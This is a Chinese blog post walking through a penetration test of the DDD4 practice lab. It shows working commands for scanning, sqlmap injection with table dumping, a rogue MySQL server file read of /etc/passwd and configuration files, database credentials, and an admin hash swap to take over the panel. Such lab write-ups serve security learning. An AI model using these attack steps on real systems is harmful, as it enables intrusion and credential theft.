+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2021/10/24/%E5%86%85%E7%BD%91180%E7%9A%84.NET%E6%8B%BFshell/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&text=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&title=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&is_video=false&description=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=打靶日记（二）linux内网完整渗透测试&body=Check out this article: https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&title=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&title=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&title=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&title=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&name=打靶日记（二）linux内网完整渗透测试&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&t=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.</span> <span class="toc-text">打靶日记（二）linux内网完整渗透测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-DDD4-%E9%9D%B6%E5%9C%BA%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">1. DDD4 靶场介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">2.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">3.1.</span> <span class="toc-text">2.1主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.2.</span> <span class="toc-text">2.2端口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-nmap-%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="toc-number">3.3.</span> <span class="toc-text">2.3.nmap 端口信息获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4gobuser-%E7%9A%84%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95"><span class="toc-number">3.4.</span> <span class="toc-text">2.4gobuser 的高级用法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">4.</span> <span class="toc-text">3. 对目标进行渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1sqlmap%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="toc-number">4.1.</span> <span class="toc-text">3.1sqlmap编码注入利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-MYSQL-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%81%B6%E6%84%8F%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">3.2.MYSQL 服务器恶意读取客户端文件漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-Rogue-MySql-Server-%E8%AF%BB%E5%8F%96%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">4.3.</span> <span class="toc-text">3.3.Rogue-MySql-Server 读取配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4%E7%99%BB%E5%BD%95-mysql"><span class="toc-number">4.4.</span> <span class="toc-text">3.4登录 mysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5%E5%90%8E%E5%8F%B0%E5%AF%86%E6%96%87%E7%99%BB%E5%BD%95"><span class="toc-number">4.5.</span> <span class="toc-text">3.5后台密文登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.6.</span> <span class="toc-text">3.6后台上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7%E6%A8%A1%E6%9D%BF%E7%BC%96%E8%BE%91%E6%8B%BF-webshell"><span class="toc-number">4.7.</span> <span class="toc-text">3.7模板编辑拿 webshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-Linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">5.</span> <span class="toc-text">4.Linux权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1%E7%AA%81%E7%A0%B4-disable-functions-%E6%8F%90%E6%9D%83"><span class="toc-number">5.1.</span> <span class="toc-text">4.1突破 disable_functions 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-metasploit-%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">5.2.</span> <span class="toc-text">4.2.metasploit 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-1-%E7%94%9F%E6%88%90%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-number">5.2.1.</span> <span class="toc-text">4.2.1.生成攻击载荷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-2%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="toc-number">5.2.2.</span> <span class="toc-text">4.2.2监听端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-3%E6%88%90%E5%8A%9F%E7%9B%91%E5%90%AC-shell"><span class="toc-number">5.2.3.</span> <span class="toc-text">4.2.3成功监听 shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3%E5%BB%BA%E7%AB%8B%E4%BA%A4%E4%BA%92shell"><span class="toc-number">5.3.</span> <span class="toc-text">4.3建立交互shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7"><span class="toc-number">5.4.</span> <span class="toc-text">4.4查看用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5%E8%8E%B7%E5%8F%96%E7%AC%AC%E4%B8%80%E4%B8%AAflag"><span class="toc-number">5.5.</span> <span class="toc-text">4.5获取第一个flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-6%E9%80%9A%E8%BF%87%E5%AE%9D%E5%A1%94%E6%8F%90%E6%9D%83%E5%88%B0root"><span class="toc-number">5.6.</span> <span class="toc-text">4.6通过宝塔提权到root</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-6%E9%80%9A%E8%BF%87-suid-%E6%8F%90%E6%9D%83%E5%88%B0-root"><span class="toc-number">5.7.</span> <span class="toc-text">4.6通过 suid 提权到 root</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-8-linux-%E4%B8%89%E5%A4%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%84%9A%E6%9C%AC%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E8%A7%A3%E9%87%8A"><span class="toc-number">5.8.</span> <span class="toc-text">4.8.linux 三大信息收集脚本的使用和解释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8-1-LinEnum-%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">5.8.1.</span> <span class="toc-text">4.8.1.LinEnum 的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8-2-linux-exploit-suggester-sh%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">5.8.2.</span> <span class="toc-text">4.8.2.linux-exploit-suggester.sh的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8-3-linuxprivchecker-py"><span class="toc-number">5.8.3.</span> <span class="toc-text">4.8.3.linuxprivchecker.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-10%E8%8E%B7%E5%8F%96%E7%AC%AC%E4%BA%8C%E4%B8%AAflage"><span class="toc-number">5.9.</span> <span class="toc-text">4.10获取第二个flage</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-linux-%E5%86%85%E7%BD%91%E8%B7%A8%E7%BD%91%E6%AE%B5%E6%B8%97%E9%80%8F"><span class="toc-number">6.</span> <span class="toc-text">5. linux 内网跨网段渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-1-%E8%8E%B7%E5%8F%96%E9%AB%98%E6%9D%83%E9%99%90%E7%9A%84-meterpreter"><span class="toc-number">7.</span> <span class="toc-text">5.1.获取高权限的 meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2%E7%BD%91%E5%8D%A1%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="toc-number">7.1.</span> <span class="toc-text">5.2网卡路由信息获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3%E6%9F%A5%E7%9C%8B-host-%E6%96%87%E4%BB%B6"><span class="toc-number">7.2.</span> <span class="toc-text">5.3查看 host 文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-4metasploit-%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91"><span class="toc-number">7.3.</span> <span class="toc-text">5.4metasploit 设置代理进入内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-1%E5%90%AF%E5%8A%A8-socks-%E6%A8%A1%E5%9D%97"><span class="toc-number">7.3.1.</span> <span class="toc-text">5.4.1启动 socks 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-2%E8%AE%BE%E7%BD%AE-proxychains-%E4%BB%A3%E7%90%86%E8%BF%9B%E5%86%85%E7%BD%91"><span class="toc-number">7.3.2.</span> <span class="toc-text">5.4.2设置 proxychains 代理进内网</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-5%E5%AF%B9-www-ddd5-com-%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B"><span class="toc-number">7.4.</span> <span class="toc-text">5.5对 www.ddd5.com 进行检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-1-%E8%AE%BE%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86%E8%AE%BF%E9%97%AE"><span class="toc-number">7.4.1.</span> <span class="toc-text">5.5.1.设置浏览器代理访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-2%E5%90%8E%E5%8F%B0%E6%8B%BF-WEBSHELL"><span class="toc-number">7.4.2.</span> <span class="toc-text">5.5.2后台拿 WEBSHELL</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-linux-%E5%86%85%E7%BD%91%E8%B7%A8%E7%BD%91%E6%AE%B5%E6%8F%90%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text">6.linux 内网跨网段提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#6-1wdcp%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83"><span class="toc-number">8.1.</span> <span class="toc-text">6.1wdcp主机提权</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        打靶日记（二）linux内网完整渗透测试
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-10-31T11:38:38.000Z" class="dt-published" itemprop="datePublished">2021-10-31</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88moon%EF%BC%89/">打靶日记（moon）</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a>, <a class="p-category" href="/tags/%E6%89%93%E7%82%B9/" rel="tag">打点</a>, <a class="p-category" href="/tags/%E7%BA%A2%E9%98%9F/" rel="tag">红队</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="打靶日记（二）linux内网完整渗透测试"><a href="#打靶日记（二）linux内网完整渗透测试" class="headerlink" title="打靶日记（二）linux内网完整渗透测试"></a>打靶日记（二）linux内网完整渗透测试</h1><p><strong>声明：此系列文章系个人记录打靶过程的文章，靶场为暗月师傅的靶场。这是第二篇。</strong></p>
+<h1 id="1-DDD4-靶场介绍"><a href="#1-DDD4-靶场介绍" class="headerlink" title="1. DDD4 靶场介绍"></a>1. DDD4 靶场介绍</h1><p>本靶场存在三个 flag 把下载到的虚拟机环境导入到虚拟机，本靶场需要把网络环境配置好。 </p>
+<p>1.1.网络示意图</p>
+<p><img src="aLiwvcp-UzbIWInlTkDoGYq9TK-5N3btQDHc_xgKO1w.png" alt="image"></p>
+<h1 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h1><h2 id="2-1主机发现"><a href="#2-1主机发现" class="headerlink" title="2.1主机发现"></a>2.1主机发现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="boBeKNPQXMu535jEiekVmfNc7LZuqTiSTkNSQFXXZeA.png" alt="image"></p>
+<h2 id="2-2端口探测"><a href="#2-2端口探测" class="headerlink" title="2.2端口探测"></a>2.2端口探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p 1-65535 192.168.1.122  --rate=10000</span><br></pre></td></tr></table></figure>
+<p><img src="5H-2EXhyD2qNM-eJXM53TTM8wYuaSAmHg-t_6eUnJs8.png" alt="image"></p>
+<h2 id="2-3-nmap-端口信息获取"><a href="#2-3-nmap-端口信息获取" class="headerlink" title="2.3.nmap 端口信息获取"></a>2.3.nmap 端口信息获取</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -p 3306,80,8888,21,888 -A 192.168.1.122 -oA ddd4-port</span><br></pre></td></tr></table></figure>
+<p><img src="RFW8U9nOZltCzcATzIvXdG_-dVCQUTH7yoeCchV9t3Y.png" alt="image"></p>
+<h2 id="2-4gobuser-的高级用法"><a href="#2-4gobuser-的高级用法" class="headerlink" title="2.4gobuser 的高级用法"></a>2.4gobuser 的高级用法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://www.ddd4.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x <span class="string">&#x27;php,zip,html,rar&#x27;</span> -o ddd4.log --wildcard -l | grep -v 10430 | grep -v <span class="string">&quot;Size: 49&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="3-对目标进行渗透测试"><a href="#3-对目标进行渗透测试" class="headerlink" title="3. 对目标进行渗透测试"></a>3. 对目标进行渗透测试</h1><h2 id="3-1sqlmap编码注入利用"><a href="#3-1sqlmap编码注入利用" class="headerlink" title="3.1sqlmap编码注入利用"></a>3.1sqlmap编码注入利用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.ddd4.com/search?keyword=11 --tamper chardoubleencode.py -v 1 --batch -p keyword</span><br></pre></td></tr></table></figure>
+<p><img src="-gmtIITLfqy6oedfzCeYkCyHOSKkbRu_LFmIPK73Nio.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.ddd4.com/search?keyword=11 --tamper chardoubleencode.py -v 1 --batch -p keyword -D www_ddd4_com --dump -T doc_user</span><br></pre></td></tr></table></figure>
+<p><img src="-M4rBTSEL-uPNKbmLkhLMYijp8M6bc_TVJr11biX-tY.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webadmin </span><br><span class="line">admin 33e2q1yc3d033e22aesyc2140aec3l850c3a99s21232f297uj57a5a7438n4a0ex4a801yc3d0</span><br></pre></td></tr></table></figure>
+<p>明文是加密的解不开的</p>
+<p> </p>
+<h2 id="3-2-MYSQL-服务器恶意读取客户端文件漏洞利用"><a href="#3-2-MYSQL-服务器恶意读取客户端文件漏洞利用" class="headerlink" title="3.2.MYSQL 服务器恶意读取客户端文件漏洞利用"></a>3.2.MYSQL 服务器恶意读取客户端文件漏洞利用</h2><p>Rogue-MySql-Server 读取文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/allyshka/Rogue-MySql-Server </span><br><span class="line">vim rogue_mysql_server.py</span><br></pre></td></tr></table></figure>
+<p><img src="mD5soiazKv4Yvy31b_rIouCW4Sv4bNpULxrF9zVMCWY.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ddd4.com/setup/checkdb.php?dbname=mysql&amp;<span class="built_in">uname</span>=root&amp;<span class="built_in">pwd</span>=123456&amp;dbhost=192.168.8.133&amp;action=chkdb</span><br></pre></td></tr></table></figure>
+<p>获取报错路径</p>
+<p><img src="i46MwEx32hMzuVSb9ehAkPdqiSITd4tWL1XcjT_i_Ho.png" alt="image"></p>
+<p>获取 &#x2F;etc&#x2F;passwd 内网</p>
+<p><img src="N5eGpHcKw2O_hQ0XNM5MLw5zw1zfm97Wh5PJZgEZg90.png" alt="image"></p>
+<h2 id="3-3-Rogue-MySql-Server-读取配置文件"><a href="#3-3-Rogue-MySql-Server-读取配置文件" class="headerlink" title="3.3.Rogue-MySql-Server 读取配置文件"></a>3.3.Rogue-MySql-Server 读取配置文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/www/wwwroot/www.ddd4.com/config/doc-config-cn.php</span><br></pre></td></tr></table></figure>
+<p><img src="lNcOugDegwk8TFfCv3f_Yjs2B-pmV9PIE0PNMO5wIE4.png" alt="image"></p>
+<p><img src="ZPceR2i3tUi9g_PcS7Rmo95NbRUoVhbNdQ44Sbfwy0M.png" alt="image"></p>
+<p>得到数据库连接文件 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dbname www_ddd4_com </span><br><span class="line">username www_ddd4_com </span><br><span class="line">password x4ix6ZrM7b8nFYHn</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="3-4登录-mysql"><a href="#3-4登录-mysql" class="headerlink" title="3.4登录 mysql"></a>3.4登录 mysql</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h192.168.8.122 -uwww_ddd4_com -px4ix6ZrM7b8nFYHn</span><br></pre></td></tr></table></figure>
+<p><img src="vZzK91Arz0BeMnJ04XYhpne_qM_dfWjue6kVUCdM_9w.png" alt="image"></p>
+<h2 id="3-5后台密文登录"><a href="#3-5后台密文登录" class="headerlink" title="3.5后台密文登录"></a>3.5后台密文登录</h2><p>密文不能直接破解，只能替换登录登录之后再替换回来，修改程序生成密文 admin 的明文为 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33e2q1yc3d033e22aesyc2140aec3l850c3a99s21232f297uj57a5a7438n4a0ex4a80 1yc3d0</span><br></pre></td></tr></table></figure>
+<p>数据库修改密文 </p>
+<p>原来的密文</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33e2q1yc3d033e22aesyc2140aec3l850c3a99s21232f297uj57a5a7438n4a0ex4a801yc3d0</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use www_ddd4_com</span><br><span class="line">update doc_user <span class="built_in">set</span> <span class="built_in">pwd</span></span><br><span class="line">=<span class="string">&#x27;33e2q1yc3d033e22aesyc2140aec3l850c3a99s21232f297uj57a5a7438n4a0ex4a801yc3d0&#x27;</span> <span class="built_in">where</span> <span class="built_in">id</span>=1;</span><br></pre></td></tr></table></figure>
+<p><img src="pKHTqWdUA3FzqVUgU_EZIPwIaKyk6O4hlqQbL3qvaZ4.png" alt="image"></p>
+<p><a target="_blank" rel="noopener" href="http://www.ddd4.com/admini/login.php">http://www.ddd4.com/admini/login.php</a></p>
+<p>admin admin</p>
+<p>成功登录后台。</p>
+<p><img src="cHL0rT91Xe3NnduVVq1FMoZAYw0ccWtRxAM16OWU_Fg.png" alt="image"></p>
+<p> </p>
